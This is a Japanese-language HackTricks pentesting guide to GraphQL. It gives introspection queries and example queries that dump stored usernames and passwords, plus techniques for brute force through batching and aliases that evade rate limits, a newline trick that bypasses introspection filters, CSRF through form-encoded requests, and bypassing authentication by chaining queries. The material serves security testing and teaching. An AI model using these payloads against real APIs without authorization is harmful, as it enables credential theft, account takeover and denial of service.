# GraphQL

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする
- **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## 導入

GraphQLは、バックエンドからデータをクエリするための簡略化されたアプローチを提供する**効率的な代替手段**として**強調**されています。 RESTとは異なり、データを収集するためにさまざまなエンドポイントに対して多数のリクエストが必要なRESTに対し、GraphQLは**単一のリクエスト**を介して必要なすべての情報を取得できます。この効率化により、データ取得プロセスの複雑さが軽減され、開発者にとって大きな**利点**となります。

## GraphQLとセキュリティ

GraphQLを含む新しい技術の登場に伴い、新しいセキュリティ脆弱性も発生します。重要な点として、**GraphQLにはデフォルトで認証メカニズムが含まれていない**ことが挙げられます。適切な認証が行われない場合、GraphQLエンドポイントは認証されていないユーザーに機密情報を公開する可能性があり、重大なセキュリティリスクを引き起こすことになります。

### ディレクトリブルートフォース攻撃とGraphQL

公開されたGraphQLインスタンスを特定するために、ディレクトリブルートフォース攻撃に特定のパスを含めることが推奨されます。これらのパスは次のとおりです：

- `/graphql`
- `/graphiql`
- `/graphql.php`
- `/graphql/console`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`

公開されたGraphQLインスタンスを特定することで、サポートされているクエリの調査が可能となります。これは、エンドポイントを介してアクセス可能なデータを理解するために重要です。GraphQLのインスペクションシステムは、スキーマがサポートするクエリを詳細に示すことでこれを容易にします。詳細については、GraphQLのインスペクションに関するドキュメントを参照してください：[**GraphQL: A query language for APIs.**](https://graphql.org/learn/introspection/)

### フィンガープリント

ツール[**graphw00f**](https://github.com/dolevf/graphw00f)は、サーバーで使用されているGraphQLエンジンを検出し、セキュリティ監査人に役立つ情報を表示することができます。

#### ユニバーサルクエリ <a href="#universal-queries" id="universal-queries"></a>

URLがGraphQLサービスであるかどうかを確認するために、**ユニバーサルクエリ** `query{__typename}` を送信できます。応答に `{"data": {"__typename": "Query"}}` が含まれている場合、URLがGraphQLエンドポイントをホストしていることが確認されます。この方法は、GraphQLの`__typename`フィールドに依存しており、クエリされたオブジェクトのタイプを明らかにします。
```javascript
query{__typename}
```
### 基本的な列挙

GraphQLは通常、**GET**、**POST** (x-www-form-urlencoded)、および**POST**(json)をサポートしています。セキュリティ上の理由から、CSRF攻撃を防ぐためにjsonのみを許可することが推奨されています。

#### イントロスペクション

スキーマ情報を発見するためにイントロスペクションを使用するには、`__schema`フィールドをクエリしてください。このフィールドはすべてのクエリのルートタイプで利用可能です。
```bash
query={__schema{types{name,fields{name}}}}
```
このクエリを使用すると、使用されているすべてのタイプの名前を見つけることができます：

![](<../../.gitbook/assets/image (202).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

このクエリを使用すると、すべてのタイプ、そのフィールド、および引数（および引数のタイプ）を抽出できます。これはデータベースをクエリする方法を知るために非常に役立ちます。

![](<../../.gitbook/assets/image (207) (3).png>)

**エラー**

**エラー**が表示されるかどうかを知ることは興味深いです。なぜなら、それらは有用な情報を提供するからです。
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**スキーマの列挙を内省によって行う**

{% hint style="info" %}
内省が有効になっている場合でも、上記のクエリが実行されない場合は、クエリ構造から`onOperation`、`onFragment`、および`onField`ディレクティブを削除してみてください。
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
インラインインスペクションクエリ：
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
最後のコード行は、GraphQLからすべてのメタ情報（オブジェクト名、パラメータ、タイプなど）をダンプするGraphQLクエリです。

![](<../../.gitbook/assets/image (206).png>)

インスペクションが有効になっている場合、[**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager)を使用して、すべてのオプションをGUIで表示できます。

### クエリ

データベース内に保存されている情報の種類がわかったので、いくつかの値を**抽出**してみましょう。

インスペクションで、**直接クエリできるオブジェクト**を見つけることができます（オブジェクトが存在するだけではクエリできません）。次の画像では、"_queryType_"が"_Query_"と呼ばれ、"_Query_"オブジェクトのフィールドの1つが"_flags_"であり、これもオブジェクトの1つであることがわかります。したがって、フラグオブジェクトをクエリできます。

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-17-48.png)

クエリ "_flags_"のタイプが "_Flags_"であることに注意してください。このオブジェクトは以下のように定義されています：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-22-57.png)

"_Flags_"オブジェクトは**名前**と**値**で構成されていることがわかります。そのため、次のクエリですべてのフラグの名前と値を取得できます：
```javascript
query={flags{name, value}}
```
注意してください。**クエリするオブジェクト**が次の例のように**string**のような**プリミティブタイプ**である場合は、次のようにクエリすることができます：
```javascript
query={hiddenFlags}
```
別の例では、"_Query_" タイプオブジェクト内に 2 つのオブジェクト "_user_" と "_users_" がある場合があります。\
これらのオブジェクトには検索に必要な引数が不要な場合、欲しいデータを要求するだけで**それらからすべての情報を取得**できます。この例では、保存されたユーザー名とパスワードを抽出できます。

![](<../../.gitbook/assets/image (208).png>)

ただし、この例では、そうしようとすると次の**エラー**が発生します:

![](<../../.gitbook/assets/image (210).png>)

何らかの方法で、"_**uid**_" 引数のタイプ _**Int**_ を使用して検索されるようです。\
とにかく、[基本列挙](graphql.md#basic-enumeration)セクションでは、必要なすべての情報を示すクエリが提案されていました: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

提供された画像を読むと、そのクエリを実行すると "_**user**_" にはタイプ _Int_ の "_**uid**_" 引数があることがわかります。

したがって、軽い _**uid**_ ブルートフォースを実行すると、_**uid**=**1**_ でユーザー名とパスワードが取得されることがわかりました:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (211).png>)

"**user**" と "**password**" の**パラメータ**を要求できることを**発見**したことに注意してください。存在しないものを探そうとすると (`query={user(uid:1){noExists}}`) 次のエラーが発生します:

![](<../../.gitbook/assets/image (213).png>)

また、**列挙フェーズ**中に "_**dbuser**_" オブジェクトに "_**user**_" と "_**password**_" というフィールドがあることがわかりました。

**クエリ文字列ダンプトリック (thanks to @BinaryShadow\_)**

`query={theusers(description: ""){username,password}}` のように文字列タイプで検索できる場合、**空の文字列**を検索すると**すべてのデータがダンプ**されます。(_この例はチュートリアルの例とは関係ありません。この例では、文字列フィールド "**description**" を使用して "**theusers**" で検索できると仮定します_).

### 検索

このセットアップでは、**データベース**には**人物**と**映画**が含まれています。**人物**は**メール**と**名前**で識別され、**映画**は**名前**と**評価**で識別されます。**人物**はお互いに友達になることができ、また映画を持つことができ、データベース内の関係を示します。

名前で人物を**検索**し、そのメールアドレスを取得できます。
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
あなたは名前で人を検索し、彼らが購読している映画を取得できます。
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
次に、人物の`subscribedMovies`の`name`を取得するように指示されていることに注目してください。

また、**同時に複数のオブジェクトを検索**することもできます。この場合、2つの映画を検索します：
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
または、**別名を使用して複数の異なるオブジェクトの関係**：
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### ミューテーション

**ミューテーションはサーバーサイドで変更を加えるために使用されます。**

**インスペクション**では、**宣言された** **ミューテーション**を見つけることができます。次の画像では、"_MutationType_" は "_Mutation_" と呼ばれ、"_Mutation_" オブジェクトにはミューテーションの名前（この場合は "_addPerson_"）が含まれています：

![](../../.gitbook/assets/screenshot-from-2021-03-13-18-26-27.png)

このセットアップでは、**データベース**には**人物**と**映画**が含まれています。**人物**は**メール**と**名前**で識別され、**映画**は**名前**と**評価**で識別されます。**人物**はお互いに友達になることができ、またデータベース内での関係を示すために映画を持つこともできます。

データベース内に**新しい**映画を作成するためのミューテーションは、次のようになります（この例ではミューテーションは `addMovie` と呼ばれています）：
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**クエリ内でデータの値とタイプが両方示されていることに注意してください。**

さらに、データベースは`addPerson`という**mutation**操作をサポートしており、これにより新しく作成された**persons**が既存の**friends**や**movies**との関連付けが可能です。重要な点として、友達や映画は新しく作成された人物にリンクする前にデータベース内に事前に存在している必要があります。
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### ディレクティブの過負荷

[**このレポートで説明されている脆弱性の1つ**](https://www.landh.tech/blog/20240304-google-hack-50000/)によると、ディレクティブの過負荷は、サーバーが操作を無駄にするまで何百万回もディレクティブを呼び出し、それによってDoS（サービス拒否）攻撃が可能になることを意味します。

### 1つのAPIリクエストでのバッチングブルートフォース

この情報は[https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/)から取得されました。\
**異なる資格情報を持つ多数のクエリを同時に送信**して認証を行うGraphQL API。これはクラシックなブルートフォース攻撃ですが、GraphQLのバッチング機能により、1つのHTTPリクエストで複数のログイン/パスワードペアを送信することが可能になりました。このアプローチにより、外部のレート監視アプリケーションをだまして、パスワードを推測しようとするブルートフォースボットが存在しないかのように見せかけることができます。

以下は、**1回に3つの異なるメール/パスワードペア**を使用してアプリケーション認証リクエストを行う最も簡単なデモンストレーションです。もちろん、同じ方法で1回に数千を送信することも可能です：

![](<../../.gitbook/assets/image (182) (1).png>)

応答スクリーンショットからわかるように、最初と3番目のリクエストは _null_ を返し、対応する情報を _error_ セクションに反映しました。**2番目のミューテーションは正しい認証**データを持ち、応答には正しい認証セッショントークンが含まれています。

![](<../../.gitbook/assets/image (119) (1).png>)

## イントロスペクションなしのGraphQL

**graphqlエンドポイントがイントロスペクションを無効にする**ケースが増えています。ただし、予期しないリクエストが受信された際にgraphqlがスローするエラーは、[**clairvoyance**](https://github.com/nikitastupin/clairvoyance)などのツールにとって、スキーマの大部分を再作成するのに十分です。

さらに、Burp Suite拡張機能[**GraphQuail**](https://github.com/forcesunseen/graphquail)は、Burpを介して通過するGraphQL APIリクエストを**監視**し、新しいクエリごとに内部のGraphQL **スキーマ**を**構築**します。また、イントロスペクションクエリを受信すると偽の応答を返します。その結果、GraphQuailはAPI内で使用可能なすべてのクエリ、引数、およびフィールドを表示します。詳細については、[**こちらをチェック**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema)。

[**こちらでGraphQLエンティティを発見するための素敵なワードリスト**](https://github.com/Escape-Technologies/graphql-wordlist?)が見つかります。

### GraphQLイントロスペクション防御のバイパス <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

### **GraphQLイントロスペクション防御のバイパス**

APIのイントロスペクションクエリに制限をバイパスするには、`__schema`キーワードの後に**特殊文字を挿入**すると効果的です。この方法は、イントロスペクションをブロックするために`__schema`キーワードに焦点を当てる正規表現パターンに一般的な開発者の見落としを利用しています。GraphQLが無視するが、正規表現で考慮されていないスペース、改行、カンマなどの文字を追加することで、制限を回避できます。たとえば、`__schema`の後に改行があるイントロスペクションクエリは、そのような防御をバイパスする可能性があります：
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
### **公開されたGraphQL構造の発見**

インスペクションが無効の場合、JavaScriptライブラリ内の事前読み込みクエリを調べることが有用です。これらのクエリは開発者ツールの`Sources`タブを使用して見つけることができ、APIのスキーマに関する洞察を提供し、**公開された機密クエリ**を明らかにします。開発者ツール内で検索するコマンドは次の通りです：
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQLにおけるCSRF

CSRFとは何かわからない場合は、以下のページを読んでください：

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

GraphQLエンドポイントの中には、**CSRFトークンなしで構成されているもの**がいくつか存在します。

GraphQLリクエストは通常、Content-Typeが**`application/json`**で送信されるPOSTリクエストを使用します。
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
しかし、ほとんどのGraphQLエンドポイントは**`form-urlencoded` POSTリクエスト**もサポートしています:
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
したがって、前述のようなCSRFリクエストは**プリフライトリクエストなし**で送信されるため、CSRFを悪用してGraphQLで**変更**を行うことが可能です。

ただし、Chromeの`SameSite`フラグの新しいデフォルトCookie値は`Lax`です。これは、CookieがサードパーティのWebからのGETリクエストでのみ送信されることを意味します。

また、**クエリリクエスト**を**GETリクエスト**として送信することも通常可能であり、GETリクエストではCSRFトークンが検証されない可能性があります。

また、[**XS-Search**](../../pentesting-web/xs-search.md) **攻撃**を悪用することで、ユーザーの資格情報を悪用してGraphQLエンドポイントからコンテンツを外部に流出させることが可能かもしれません。

詳細については、[**こちらの元の投稿**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html)をご覧ください。

## GraphQLでの認証

エンドポイントで定義された多くのGraphQL関数は、リクエスト元の認証のみをチェックし、認可を行わない場合があります。

クエリ入力変数の変更により、機密なアカウント詳細が[**漏洩**](https://hackerone.com/reports/792927)する可能性があります。

変異は、他のアカウントデータを変更しようとすることで、アカウント乗っ取りにつながる可能性さえあります。
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQLでの認証のバイパス

[クエリを連鎖させる](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln)ことで、弱い認証システムをバイパスできます。

以下の例では、操作が「forgotPassword」であり、それに関連するforgotPasswordクエリのみを実行すべきであることがわかります。これは、末尾にクエリを追加することでバイパスできます。この場合、「register」を追加し、新しいユーザーとしてシステムに登録するためのユーザー変数を追加します。

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQLでエイリアスを使用してレート制限をバイパスする

GraphQLでは、エイリアスはAPIリクエストを行う際に**プロパティを明示的に命名**する強力な機能です。この機能は、1つのリクエスト内で**同じタイプのオブジェクトの複数のインスタンス**を取得する際に特に便利です。エイリアスは、GraphQLオブジェクトが同じ名前の複数のプロパティを持つことを防ぐ制限を克服するために使用できます。

GraphQLエイリアスの詳細な理解のためには、次のリソースが推奨されます: [エイリアス](https://portswigger.net/web-security/graphql/what-is-graphql#aliases)。

エイリアスの主な目的は、多数のAPI呼び出しを必要としないようにすることですが、エイリアスを使用してGraphQLエンドポイントでブルートフォース攻撃を実行するという意図しないユースケースが特定されています。これは、一部のエンドポイントが**HTTPリクエストの数**を制限することでブルートフォース攻撃を防ぐように設計されたレートリミッターで保護されているため可能です。ただし、これらのレートリミッターは、各リクエスト内の操作の数を考慮していないかもしれません。エイリアスを使用すると、1つのHTTPリクエスト内に複数のクエリを含めることができるため、このようなレート制限措置を回避できます。

以下の例を考えてみてください。これは、エイリアス付きクエリを使用してストアの割引コードの有効性を検証する方法を示しており、この方法は、複数の割引コードの検証を同時に行う可能性があるため、レート制限を回避できるかもしれません。
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## ツール

### 脆弱性スキャナー

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): スキーマを取得し、機密データを検索し、認可をテストし、スキーマを総当たり攻撃し、特定のタイプへのパスを見つけるために使用できるツールキット。
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): スタンドアロンまたは[Burp拡張機能](https://github.com/doyensec/inql)として使用できます。
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): CLIクライアントとしても使用でき、攻撃を自動化するためにも使用できます。
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): GraphQLスキーマ内の特定のタイプに到達する異なる方法をリストするツール。
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): 高度なGraphQLテスト用のBurp拡張機能。 _**Scanner**_ はInQL v5.0のコアであり、GraphQLエンドポイントまたはローカルの自己紹介スキーマファイルを分析できます。すべての可能なクエリとミューテーションを自動生成し、分析のために構造化されたビューに整理します。 _**Attacker**_ コンポーネントを使用すると、バッチGraphQL攻撃を実行でき、実装が不十分なレート制限を回避するのに役立ちます。

### クライアント

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUIクライアント
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUIクライアント

### 自動テスト

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQLの説明ビデオ: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## 参考文献

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEでAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
